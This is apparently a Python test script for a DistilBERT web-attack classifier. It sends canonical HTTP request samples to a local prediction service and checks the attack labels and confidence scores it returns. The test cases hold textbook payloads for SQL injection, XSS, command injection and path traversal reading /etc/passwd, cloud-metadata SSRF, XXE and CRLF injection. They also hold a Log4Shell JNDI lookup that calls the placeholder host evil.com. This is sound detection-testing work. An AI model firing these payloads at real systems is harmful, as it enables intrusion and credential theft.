#!/usr/bin/env python3
"""
Pure ML-service test — talks DIRECTLY to the DistilBERT inference API on
port 8000, with NO WAF in the loop.

Where test_ml_gray_zone.py checks the *WAF→model* wiring, this one isolates the
model itself: it POSTs canonical request text straight to /predict (and
/predict_batch) and asserts the classifier returns the right attack class with
sane confidence. Use it to sanity-check a freshly-loaded / re-trained model.

The input is the "WAF canonical" text the model was trained on:

    METHOD PATH
    Host: ...
    User-Agent: ...

    <body>

Run (ML service must be up — `make ml-start` or `make run`):
    .venv/bin/python scripts/test_ml_service.py
    .venv/bin/python scripts/test_ml_service.py --url http://127.0.0.1:8000

Exit code 0 = all assertions passed, 1 = a failure (CI-friendly).
"""

from __future__ import annotations

import argparse
import sys

import requests

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/124.0"

# Minimum confidence we expect. The model is ~0.9+ on attacks; "normal" sits
# lower because benign traffic is more varied, so it gets a gentler floor.
ATTACK_MIN_CONF = 0.60
NORMAL_MIN_CONF = 0.50

_passed = 0
_failed = 0


def check(cond: bool, label: str) -> None:
    global _passed, _failed
    if cond:
        _passed += 1
        print(f"  \033[32mPASS\033[0m  {label}")
    else:
        _failed += 1
        print(f"  \033[31mFAIL\033[0m  {label}")


def canonical(method: str, path: str, body: str = "") -> str:
    """Assemble the WAF-canonical text the model was trained on."""
    text = f"{method} {path}\nHost: shop.local\nUser-Agent: {UA}"
    if body:
        text += f"\n\n{body}"
    return text


# (expected_label, canonical_text) — one representative payload per class.
CASES = [
    ("normal",         canonical("GET", "/products?page=2")),
    ("sqli",           canonical("GET", "/?id=1 UNION SELECT username,password FROM users--")),
    ("xss",            canonical("GET", "/?q=<script>alert(1)</script>")),
    ("cmdi",           canonical("GET", "/?x=; cat /etc/passwd")),
    ("path_traversal", canonical("GET", "/?file=../../../../etc/passwd")),
    ("ssrf",           canonical("GET", "/?url=http://169.254.169.254/latest/meta-data/")),
    ("log4shell",      canonical("GET", "/?x=${jndi:ldap://evil.com/a}")),
    ("ssti",           canonical("GET", "/?q={{7*7}}")),
    ("nosqli",         canonical("GET", "/?user[$ne]=null&pass[$ne]=null")),
    ("crlf",           canonical("GET", "/?q=foo\nSet-Cookie: evil=1")),
    ("xxe",            canonical("POST", "/upload",
                                 '<?xml version="1.0"?><!DOCTYPE foo '
                                 '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>')),
]


def predict(base: str, text: str) -> dict:
    r = requests.post(base.rstrip("/") + "/predict",
                      json={"text": text}, timeout=15)
    r.raise_for_status()
    return r.json()


def run(base: str) -> None:
    print(f"Target: {base}  (ML service, no WAF)\n")

    print("0) /health — model loaded and labels exposed")
    h = requests.get(base.rstrip("/") + "/health", timeout=10).json()
    labels = h.get("labels", [])
    print(f"   status={h.get('status')} labels={labels}")
    check(h.get("status") == "ok", "service reports ok")
    expected_classes = {e for e, _ in CASES}
    check(expected_classes.issubset(set(labels)),
          "all tested classes are in the model's label set")

    print("\n1) /predict — one canonical payload per class")
    for expected, text in CASES:
        d = predict(base, text)
        got, conf, atk = d.get("label"), d.get("confidence", 0.0), d.get("is_attack")
        floor = NORMAL_MIN_CONF if expected == "normal" else ATTACK_MIN_CONF
        ok = got == expected and conf >= floor and atk == (expected != "normal")
        check(ok, f"{expected:<14} -> got={got:<14} conf={conf:.3f} is_attack={atk}")

    print("\n2) Empty text — must short-circuit to 'normal'")
    d = predict(base, "")
    check(d.get("label") == "normal" and d.get("is_attack") is False,
          f"empty -> label={d.get('label')} is_attack={d.get('is_attack')}")

    print("\n3) /predict_batch — same payloads in one call, order preserved")
    texts = [t for _, t in CASES]
    r = requests.post(base.rstrip("/") + "/predict_batch",
                      json={"texts": texts}, timeout=30)
    r.raise_for_status()
    preds = r.json().get("predictions", [])
    check(len(preds) == len(CASES), f"got {len(preds)} predictions for {len(CASES)} inputs")
    matched = sum(1 for (exp, _), p in zip(CASES, preds) if p.get("label") == exp)
    check(matched == len(CASES),
          f"batch labels match single-call labels ({matched}/{len(CASES)})")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Pure ML-service (:8000) test")
    p.add_argument("--url", default="http://127.0.0.1:8000",
                   help="ML service base URL (default: %(default)s)")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    try:
        requests.get(args.url.rstrip("/") + "/health", timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"Error: cannot reach ML service at {args.url} ({e.__class__.__name__})")
        print("Hint: start it with  make ml-start  (or  make run)")
        return 1

    run(args.url)

    bar = "-" * 56
    print(f"\n{bar}\nResult: {_passed} passed, {_failed} failed\n{bar}")
    return 0 if _failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
